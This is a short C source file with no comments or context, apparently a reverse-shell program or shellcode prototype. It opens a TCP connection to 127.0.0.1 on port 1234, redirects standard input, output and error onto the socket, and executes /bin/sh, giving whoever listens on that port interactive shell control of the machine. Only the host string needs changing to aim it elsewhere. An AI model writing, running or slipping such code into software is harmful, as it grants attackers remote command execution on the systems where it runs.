#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

unsigned short int port = 1234;
const char* host = "127.0.0.1";

int main()
{
	int sock = socket( AF_INET, SOCK_STREAM, 0 );
	struct sockaddr_in addr;
	memset( &addr, 0, sizeof( struct sockaddr_in ) );
	addr.sin_family = AF_INET;
	addr.sin_port = htons( port );
	inet_aton( host, &addr.sin_addr );

	int ret = connect( sock, ( struct sockaddr* )&addr, sizeof( struct sockaddr_in ) );
	if( ret < 0 )
		return 1;

	dup2( sock, 0 );
	dup2( sock, 1 );
	dup2( sock, 2 );

	execl( "/bin/sh", "sh", NULL );

	close( sock );

	return 0;
}